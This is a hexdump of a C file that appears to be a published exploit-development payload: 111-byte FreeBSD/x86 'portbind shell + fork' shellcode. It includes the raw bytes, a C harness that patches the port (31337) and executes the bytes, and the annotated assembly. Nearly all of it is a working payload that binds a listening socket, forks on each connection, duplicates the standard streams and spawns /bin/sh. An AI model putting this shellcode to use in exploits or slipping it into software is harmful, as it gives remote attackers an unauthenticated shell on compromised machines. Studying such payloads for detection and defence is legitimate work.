00000000  2f 2a 0d 0a 20 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |/*.. -----------|
00000010  2d 2d 2d 20 46 72 65 65  42 53 44 2f 78 38 36 20  |--- FreeBSD/x86 |
00000020  2d 20 70 6f 72 74 62 69  6e 64 20 73 68 65 6c 6c  |- portbind shell|
00000030  20 2b 20 66 6f 72 6b 20  28 31 31 31 20 62 79 74  | + fork (111 byt|
00000040  65 73 29 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |es)-------------|
00000050  2d 2d 2d 2d 2d 2d 2d 0d  0a 20 2a 20 20 41 55 54  |-------.. *  AUT|
00000060  48 4f 52 20 3a 20 54 6f  73 68 0d 0a 20 2a 20 20  |HOR : Tosh.. *  |
00000070  20 4f 53 20 20 20 20 3a  20 42 53 44 78 38 36 20  | OS    : BSDx86 |
00000080  28 54 65 73 74 65 64 20  6f 6e 20 46 72 65 65 42  |(Tested on FreeB|
00000090  53 44 20 38 2e 31 29 0d  0a 20 2a 20 20 20 45 4d  |SD 8.1).. *   EM|
000000a0  41 49 4c 20 3a 20 74 6f  73 68 40 74 75 78 66 61  |AIL : tosh@tuxfa|
000000b0  6d 69 6c 79 2e 6f 72 67  0d 0a 20 2a 2f 0d 0a 0d  |mily.org.. */...|
000000c0  0a 0d 0a 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |.....#include <s|
000000d0  74 64 69 6f 2e 68 3e 0d  0a 23 69 6e 63 6c 75 64  |tdio.h>..#includ|
000000e0  65 20 3c 73 74 72 69 6e  67 2e 68 3e 0d 0a 23 69  |e <string.h>..#i|
000000f0  6e 63 6c 75 64 65 20 3c  61 72 70 61 2f 69 6e 65  |nclude <arpa/ine|
00000100  74 2e 68 3e 0d 0a 0d 0a  63 68 61 72 20 73 68 65  |t.h>....char she|
00000110  6c 6c 63 6f 64 65 20 5b  5d 20 3d 20 22 5c 78 33  |llcode [] = "\x3|
00000120  31 5c 78 63 39 5c 78 66  37 5c 78 65 31 5c 78 35  |1\xc9\xf7\xe1\x5|
00000130  31 5c 78 34 30 5c 78 35  30 5c 78 34 30 5c 78 35  |1\x40\x50\x40\x5|
00000140  30 5c 78 35 30 5c 78 62  30 5c 78 36 31 5c 78 63  |0\x50\xb0\x61\xc|
00000150  64 5c 78 38 30 5c 78 39  36 5c 78 35 32 5c 78 36  |d\x80\x96\x52\x6|
00000160  36 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |6"..            |
00000170  20 20 20 20 20 20 20 20  22 5c 78 36 38 5c 78 30  |        "\x68\x0|
00000180  35 5c 78 33 39 5c 78 36  36 5c 78 36 38 5c 78 30  |5\x39\x66\x68\x0|
00000190  31 5c 78 30 32 5c 78 38  39 5c 78 65 31 5c 78 36  |1\x02\x89\xe1\x6|
000001a0  61 5c 78 31 30 5c 78 35  31 5c 78 35 36 5c 78 35  |a\x10\x51\x56\x5|
000001b0  30 5c 78 62 30 5c 78 36  38 5c 78 63 64 22 0d 0a  |0\xb0\x68\xcd"..|
000001c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001d0  20 20 20 20 22 5c 78 38  30 5c 78 33 31 5c 78 63  |    "\x80\x31\xc|
000001e0  30 5c 78 62 30 5c 78 30  35 5c 78 35 30 5c 78 35  |0\xb0\x05\x50\x5|
000001f0  36 5c 78 35 30 5c 78 62  30 5c 78 36 61 5c 78 63  |6\x50\xb0\x6a\xc|
00000200  64 5c 78 38 30 5c 78 33  31 5c 78 63 30 5c 78 35  |d\x80\x31\xc0\x5|
00000210  30 5c 78 35 30 5c 78 35  36 22 0d 0a 20 20 20 20  |0\x50\x56"..    |
00000220  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000230  22 5c 78 35 30 5c 78 62  30 5c 78 31 65 5c 78 63  |"\x50\xb0\x1e\xc|
00000240  64 5c 78 38 30 5c 78 39  37 5c 78 33 31 5c 78 63  |d\x80\x97\x31\xc|
00000250  30 5c 78 35 30 5c 78 62  30 5c 78 30 32 5c 78 63  |0\x50\xb0\x02\xc|
00000260  64 5c 78 38 30 5c 78 30  39 5c 78 63 30 5c 78 37  |d\x80\x09\xc0\x7|
00000270  34 5c 78 65 61 22 0d 0a  20 20 20 20 20 20 20 20  |4\xea"..        |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 33  |            "\x3|
00000290  31 5c 78 63 39 5c 78 33  31 5c 78 63 30 5c 78 35  |1\xc9\x31\xc0\x5|
000002a0  31 5c 78 35 37 5c 78 35  30 5c 78 62 30 5c 78 35  |1\x57\x50\xb0\x5|
000002b0  61 5c 78 63 64 5c 78 38  30 5c 78 66 65 5c 78 63  |a\xcd\x80\xfe\xc|
000002c0  31 5c 78 38 30 5c 78 66  39 5c 78 30 33 5c 78 37  |1\x80\xf9\x03\x7|
000002d0  35 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |5"..            |
000002e0  20 20 20 20 20 20 20 20  22 5c 78 66 30 5c 78 35  |        "\xf0\x5|
000002f0  32 5c 78 36 38 5c 78 32  66 5c 78 32 66 5c 78 37  |2\x68\x2f\x2f\x7|
00000300  33 5c 78 36 38 5c 78 36  38 5c 78 32 66 5c 78 36  |3\x68\x68\x2f\x6|
00000310  32 5c 78 36 39 5c 78 36  65 5c 78 38 39 5c 78 65  |2\x69\x6e\x89\xe|
00000320  33 5c 78 35 32 5c 78 35  33 5c 78 38 39 22 0d 0a  |3\x52\x53\x89"..|
00000330  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000340  20 20 20 20 22 5c 78 65  31 5c 78 35 32 5c 78 35  |    "\xe1\x52\x5|
00000350  31 5c 78 35 33 5c 78 62  30 5c 78 33 62 5c 78 35  |1\x53\xb0\x3b\x5|
00000360  30 5c 78 63 64 5c 78 38  30 22 3b 0d 0a 0d 0a 76  |0\xcd\x80";....v|
00000370  6f 69 64 20 63 68 61 6e  67 65 5f 73 68 65 6c 6c  |oid change_shell|
00000380  63 6f 64 65 28 75 6e 73  69 67 6e 65 64 20 73 68  |code(unsigned sh|
00000390  6f 72 74 20 70 6f 72 74  29 0d 0a 7b 0d 0a 20 20  |ort port)..{..  |
000003a0  20 2a 28 28 75 6e 73 69  67 6e 65 64 20 73 68 6f  | *((unsigned sho|
000003b0  72 74 2a 29 28 73 68 65  6c 6c 63 6f 64 65 20 2b  |rt*)(shellcode +|
000003c0  20 31 38 29 29 20 3d 20  68 74 6f 6e 73 28 70 6f  | 18)) = htons(po|
000003d0  72 74 29 3b 0d 0a 7d 0d  0a 76 6f 69 64 20 70 72  |rt);..}..void pr|
000003e0  69 6e 74 5f 73 68 65 6c  6c 63 6f 64 65 28 76 6f  |int_shellcode(vo|
000003f0  69 64 29 0d 0a 7b 0d 0a  20 20 20 69 6e 74 20 69  |id)..{..   int i|
00000400  3b 0d 0a 20 20 20 66 6f  72 28 69 20 3d 20 30 3b  |;..   for(i = 0;|
00000410  20 69 20 3c 20 73 69 7a  65 6f 66 28 73 68 65 6c  | i < sizeof(shel|
00000420  6c 63 6f 64 65 29 20 2d  20 31 3b 20 69 2b 2b 29  |lcode) - 1; i++)|
00000430  0d 0a 20 20 20 7b 0d 0a  20 20 20 20 20 20 70 72  |..   {..      pr|
00000440  69 6e 74 66 28 22 5c 5c  78 25 2e 32 78 22 2c 20  |intf("\\x%.2x", |
00000450  28 75 6e 73 69 67 6e 65  64 20 63 68 61 72 29 73  |(unsigned char)s|
00000460  68 65 6c 6c 63 6f 64 65  5b 69 5d 29 3b 0d 0a 20  |hellcode[i]);.. |
00000470  20 20 7d 0d 0a 20 20 20  70 72 69 6e 74 66 28 22  |  }..   printf("|
00000480  5c 6e 22 29 3b 0d 0a 7d  0d 0a 69 6e 74 20 6d 61  |\n");..}..int ma|
00000490  69 6e 28 76 6f 69 64 29  0d 0a 7b 0d 0a 20 20 20  |in(void)..{..   |
000004a0  75 6e 73 69 67 6e 65 64  20 73 68 6f 72 74 20 70  |unsigned short p|
000004b0  6f 72 74 20 3d 20 33 31  33 33 37 3b 0d 0a 0d 0a  |ort = 31337;....|
000004c0  20 20 20 63 68 61 6e 67  65 5f 73 68 65 6c 6c 63  |   change_shellc|
000004d0  6f 64 65 28 70 6f 72 74  29 3b 0d 0a 20 20 20 70  |ode(port);..   p|
000004e0  72 69 6e 74 5f 73 68 65  6c 6c 63 6f 64 65 28 29  |rint_shellcode()|
000004f0  3b 0d 0a 20 20 20 70 72  69 6e 74 66 28 22 53 68  |;..   printf("Sh|
00000500  65 6c 6c 63 6f 64 65 20  6c 65 6e 20 3d 20 25 64  |ellcode len = %d|
00000510  20 62 79 74 65 73 5c 6e  22 2c 20 73 69 7a 65 6f  | bytes\n", sizeo|
00000520  66 28 73 68 65 6c 6c 63  6f 64 65 29 2d 31 29 3b  |f(shellcode)-1);|
00000530  0d 0a 20 20 20 76 6f 69  64 20 28 2a 66 29 28 29  |..   void (*f)()|
00000540  20 3d 20 28 76 6f 69 64  2a 29 20 73 68 65 6c 6c  | = (void*) shell|
00000550  63 6f 64 65 3b 0d 0a 0d  0a 20 20 20 66 28 29 3b  |code;....   f();|
00000560  0d 0a 0d 0a 20 20 20 72  65 74 75 72 6e 20 30 3b  |....   return 0;|
00000570  0d 0a 7d 0d 0a 0d 0a 2f  2a 0d 0a 20 20 20 73 65  |..}..../*..   se|
00000580  63 74 69 6f 6e 20 2e 74  65 78 74 0d 0a 20 20 20  |ction .text..   |
00000590  20 20 20 67 6c 6f 62 61  6c 20 5f 73 74 61 72 74  |   global _start|
000005a0  0d 0a 0d 0a 20 20 20 5f  73 74 61 72 74 3a 0d 0a  |....   _start:..|
000005b0  20 20 20 20 20 20 78 6f  72 20 65 63 78 2c 20 65  |      xor ecx, e|
000005c0  63 78 0d 0a 20 20 20 20  20 20 6d 75 6c 20 65 63  |cx..      mul ec|
000005d0  78 0d 0a 20 20 20 20 20  20 70 75 73 68 20 65 63  |x..      push ec|
000005e0  78 20 20 20 20 20 20 20  20 20 20 0d 0a 20 20 20  |x          ..   |
000005f0  20 20 20 69 6e 63 20 65  61 78 0d 0a 20 20 20 20  |   inc eax..    |
00000600  20 20 70 75 73 68 20 65  61 78 20 20 20 20 20 20  |  push eax      |
00000610  20 20 0d 0a 20 20 20 20  20 20 69 6e 63 20 65 61  |  ..      inc ea|
00000620  78 0d 0a 20 20 20 20 20  20 70 75 73 68 20 65 61  |x..      push ea|
00000630  78 20 20 20 20 20 20 20  20 0d 0a 20 20 20 20 20  |x        ..     |
00000640  20 70 75 73 68 20 65 61  78 20 20 20 20 20 20 20  | push eax       |
00000650  20 0d 0a 20 20 20 20 20  20 6d 6f 76 20 61 6c 2c  | ..      mov al,|
00000660  20 39 37 20 20 20 20 20  20 20 20 3b 20 73 6f 63  | 97        ; soc|
00000670  6b 65 74 28 41 46 5f 49  4e 45 54 2c 20 53 4f 43  |ket(AF_INET, SOC|
00000680  4b 5f 53 54 52 45 41 4d  2c 20 30 29 0d 0a 20 20  |K_STREAM, 0)..  |
00000690  20 20 20 20 69 6e 74 20  30 78 38 30 0d 0a 20 20  |    int 0x80..  |
000006a0  20 20 20 0d 0a 20 20 20  20 20 20 78 63 68 67 20  |   ..      xchg |
000006b0  65 73 69 2c 20 65 61 78  20 20 20 20 0d 0a 20 20  |esi, eax    ..  |
000006c0  20 20 20 0d 0a 20 20 20  20 20 20 70 75 73 68 20  |   ..      push |
000006d0  65 64 78 20 20 20 20 20  20 20 20 20 20 0d 0a 20  |edx          .. |
000006e0  20 20 20 20 20 70 75 73  68 20 77 6f 72 64 20 30  |     push word 0|
000006f0  78 33 39 30 35 20 20 0d  0a 20 20 20 20 20 20 70  |x3905  ..      p|
00000700  75 73 68 20 77 6f 72 64  20 30 78 30 32 30 31 0d  |ush word 0x0201.|
00000710  0a 20 20 20 20 20 20 6d  6f 76 20 65 63 78 2c 20  |.      mov ecx, |
00000720  65 73 70 20 20 20 20 0d  0a 20 20 20 20 20 0d 0a  |esp    ..     ..|
00000730  20 20 20 20 20 20 70 75  73 68 20 62 79 74 65 20  |      push byte |
00000740  31 36 20 20 20 20 20 20  0d 0a 20 20 20 20 20 20  |16      ..      |
00000750  70 75 73 68 20 65 63 78  20 20 20 20 20 20 20 20  |push ecx        |
00000760  0d 0a 20 20 20 20 20 20  70 75 73 68 20 65 73 69  |..      push esi|
00000770  20 20 20 20 20 20 20 20  0d 0a 20 20 20 20 20 20  |        ..      |
00000780  70 75 73 68 20 65 61 78  20 20 20 20 20 20 20 20  |push eax        |
00000790  0d 0a 20 20 20 20 20 20  6d 6f 76 20 61 6c 2c 20  |..      mov al, |
000007a0  31 30 34 20 20 20 20 20  20 20 3b 20 62 69 6e 64  |104       ; bind|
000007b0  28 73 6f 63 6b 2c 20 73  6f 63 6b 61 64 64 72 2a  |(sock, sockaddr*|
000007c0  2c 20 73 69 7a 65 6f 66  28 73 6f 63 6b 61 64 64  |, sizeof(sockadd|
000007d0  72 29 29 0d 0a 20 20 20  20 20 20 69 6e 74 20 30  |r))..      int 0|
000007e0  78 38 30 0d 0a 20 20 20  20 20 0d 0a 20 20 20 20  |x80..     ..    |
000007f0  20 20 78 6f 72 20 65 61  78 2c 20 65 61 78 0d 0a  |  xor eax, eax..|
00000800  20 20 20 20 20 20 6d 6f  76 20 61 6c 2c 20 35 0d  |      mov al, 5.|
00000810  0a 20 20 20 20 20 20 70  75 73 68 20 65 61 78 0d  |.      push eax.|
00000820  0a 20 20 20 20 20 20 70  75 73 68 20 65 73 69 0d  |.      push esi.|
00000830  0a 20 20 20 20 20 20 70  75 73 68 20 65 61 78 0d  |.      push eax.|
00000840  0a 20 20 20 20 20 20 6d  6f 76 20 61 6c 2c 20 31  |.      mov al, 1|
00000850  30 36 20 20 20 20 20 20  20 3b 20 6c 69 73 74 65  |06       ; liste|
00000860  6e 28 73 6f 63 6b 2c 20  35 29 0d 0a 20 20 20 20  |n(sock, 5)..    |
00000870  20 20 69 6e 74 20 30 78  38 30 0d 0a 0d 0a 20 20  |  int 0x80....  |
00000880  20 2e 41 43 43 45 50 54  3a 20 20 0d 0a 20 20 20  | .ACCEPT:  ..   |
00000890  20 20 20 78 6f 72 20 65  61 78 2c 20 65 61 78 0d  |   xor eax, eax.|
000008a0  0a 20 20 20 20 20 20 70  75 73 68 20 65 61 78 0d  |.      push eax.|
*
000008c0  0a 20 20 20 20 20 20 70  75 73 68 20 65 73 69 0d  |.      push esi.|
000008d0  0a 20 20 20 20 20 20 70  75 73 68 20 65 61 78 0d  |.      push eax.|
000008e0  0a 20 20 20 20 20 20 6d  6f 76 20 61 6c 2c 20 33  |.      mov al, 3|
000008f0  30 20 20 20 20 20 20 20  20 3b 20 61 63 63 65 70  |0        ; accep|
00000900  74 28 73 6f 63 6b 2c 20  30 2c 20 30 29 0d 0a 20  |t(sock, 0, 0).. |
00000910  20 20 20 20 20 69 6e 74  20 30 78 38 30 0d 0a 20  |     int 0x80.. |
00000920  20 20 20 20 0d 0a 20 20  20 20 20 20 78 63 68 67  |    ..      xchg|
00000930  20 65 64 69 2c 20 65 61  78 0d 0a 20 20 20 20 20  | edi, eax..     |
00000940  0d 0a 20 20 20 20 20 20  78 6f 72 20 65 61 78 2c  |..      xor eax,|
00000950  20 65 61 78 0d 0a 20 20  20 20 20 20 70 75 73 68  | eax..      push|
00000960  20 65 61 78 0d 0a 20 20  20 20 20 20 6d 6f 76 20  | eax..      mov |
00000970  61 6c 2c 20 32 20 20 20  20 20 20 20 20 20 3b 20  |al, 2         ; |
00000980  66 6f 72 6b 28 29 0d 0a  20 20 20 20 20 20 69 6e  |fork()..      in|
00000990  74 20 30 78 38 30 0d 0a  20 20 20 20 20 0d 0a 20  |t 0x80..     .. |
000009a0  20 20 20 20 20 6f 72 20  65 61 78 2c 20 65 61 78  |     or eax, eax|
000009b0  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 6a 7a  |      ..      jz|
000009c0  20 2e 41 43 43 45 50 54  0d 0a 20 20 20 20 20 0d  | .ACCEPT..     .|
000009d0  0a 20 20 20 20 20 0d 0a  20 20 20 20 20 20 78 6f  |.     ..      xo|
000009e0  72 20 65 63 78 2c 20 65  63 78 20 20 20 20 20 20  |r ecx, ecx      |
000009f0  3b 20 64 75 70 32 20 53  54 44 45 52 52 2c 20 53  |; dup2 STDERR, S|
00000a00  54 44 49 4e 2c 20 53 54  44 4f 55 54 0d 0a 20 20  |TDIN, STDOUT..  |
00000a10  20 2e 4c 3a 0d 0a 20 20  20 20 20 20 78 6f 72 20  | .L:..      xor |
00000a20  65 61 78 2c 20 65 61 78  0d 0a 20 20 20 20 20 20  |eax, eax..      |
00000a30  70 75 73 68 20 65 63 78  0d 0a 20 20 20 20 20 20  |push ecx..      |
00000a40  70 75 73 68 20 65 64 69  0d 0a 20 20 20 20 20 20  |push edi..      |
00000a50  70 75 73 68 20 65 61 78  0d 0a 20 20 20 20 20 20  |push eax..      |
00000a60  6d 6f 76 20 61 6c 2c 20  39 30 20 20 20 20 20 20  |mov al, 90      |
00000a70  0d 0a 20 20 20 20 20 20  69 6e 74 20 30 78 38 30  |..      int 0x80|
00000a80  0d 0a 20 20 20 20 20 20  69 6e 63 20 63 6c 0d 0a  |..      inc cl..|
00000a90  20 20 20 20 20 20 63 6d  70 20 63 6c 2c 20 33 0d  |      cmp cl, 3.|
00000aa0  0a 20 20 20 20 20 20 6a  6e 65 20 2e 4c 0d 0a 20  |.      jne .L.. |
00000ab0  20 20 20 20 0d 0a 20 20  20 20 20 20 70 75 73 68  |    ..      push|
00000ac0  20 65 64 78 20 20 20 20  20 20 20 20 0d 0a 20 20  | edx        ..  |
00000ad0  20 20 20 20 70 75 73 68  20 27 2f 2f 73 68 27 0d  |    push '//sh'.|
00000ae0  0a 20 20 20 20 20 20 70  75 73 68 20 27 2f 62 69  |.      push '/bi|
00000af0  6e 27 20 20 20 20 20 20  0d 0a 20 20 20 20 20 0d  |n'      ..     .|
00000b00  0a 20 20 20 20 20 20 6d  6f 76 20 65 62 78 2c 20  |.      mov ebx, |
00000b10  65 73 70 20 20 20 20 20  20 0d 0a 20 20 20 20 20  |esp      ..     |
00000b20  20 70 75 73 68 20 65 64  78 20 20 20 20 20 20 20  | push edx       |
00000b30  20 20 20 0d 0a 20 20 20  20 20 20 70 75 73 68 20  |   ..      push |
00000b40  65 62 78 20 20 20 20 20  20 20 20 20 20 0d 0a 20  |ebx          .. |
00000b50  20 20 20 20 20 6d 6f 76  20 65 63 78 2c 20 65 73  |     mov ecx, es|
00000b60  70 20 20 20 20 20 20 0d  0a 20 20 20 20 20 20 70  |p      ..      p|
00000b70  75 73 68 20 65 64 78 20  20 20 20 20 20 20 20 20  |ush edx         |
00000b80  20 0d 0a 20 20 20 20 20  20 70 75 73 68 20 65 63  | ..      push ec|
00000b90  78 20 20 20 20 20 20 20  20 20 20 0d 0a 20 20 20  |x          ..   |
00000ba0  20 20 20 70 75 73 68 20  65 62 78 20 20 20 20 20  |   push ebx     |
00000bb0  20 20 20 20 20 0d 0a 20  20 20 20 20 20 6d 6f 76  |     ..      mov|
00000bc0  20 61 6c 2c 20 35 39 20  20 20 20 20 20 20 20 3b  | al, 59        ;|
00000bd0  20 65 78 65 63 76 65 28  22 2f 62 69 6e 2f 2f 73  | execve("/bin//s|
00000be0  68 22 2c 20 5b 22 2f 62  69 6e 2f 73 68 22 2c 20  |h", ["/bin/sh", |
00000bf0  4e 55 4c 4c 5d 2c 20 4e  55 4c 4c 29 0d 0a 20 20  |NULL], NULL)..  |
00000c00  20 20 20 20 70 75 73 68  20 65 61 78 20 20 20 20  |    push eax    |
00000c10  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 69 6e  |      ..      in|
00000c20  74 20 30 78 38 30 0d 0a  2a 2f                    |t 0x80..*/|
00000c2a
